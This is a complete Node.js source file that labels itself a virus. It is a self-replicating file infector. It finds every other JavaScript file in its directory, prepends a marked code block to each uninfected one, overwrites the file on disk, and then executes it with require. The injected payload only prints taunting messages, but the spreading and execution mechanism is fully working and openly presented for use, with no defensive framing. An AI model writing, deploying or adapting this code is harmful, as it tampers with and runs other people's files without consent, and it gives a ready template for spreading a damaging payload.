/* Main virus file */
const fs = require('fs');
const path = require('path');
let files;

function init(){
  /// 1. reading files in directory - filtering for javascript files - that aren't me
  files = fs
    .readdirSync(__dirname)
    .filter((file) => file.match(/.js$/g))
    .filter((file) => file !== path.basename(__filename));
  /// 2. reading contents for js files
  for(let i =0 ; i < files.length;i++){
    const filePath = path.join(__dirname,files[i]);
    const fileBuff = fs.readFileSync(filePath)
    let fileContent = fileBuff.toString("utf-8");
    const virusContent = `
// #UNIQUEVIRUSSTRING
(function(){
  console.log('sneakily executed! >:-)');
  console.log(__filename,' ... I know where you live :)')
})()
// #endVirus
`;
    if(!fileContent.match(/#UNIQUEVIRUSSTRING/g)){
// 3. adding in the virus content to the file content
      fileContent = virusContent + fileContent;
// 4. overwriting the file with the new filecontent
      fs.writeFileSync(filePath,Buffer.from(fileContent));
      remoteExecute(files[i]);
    }
  }
}

function remoteExecute(filename){
  /// loading the javascript file
  const filePath = path.join(__dirname,filename);
  const func = require(filePath);
}

init();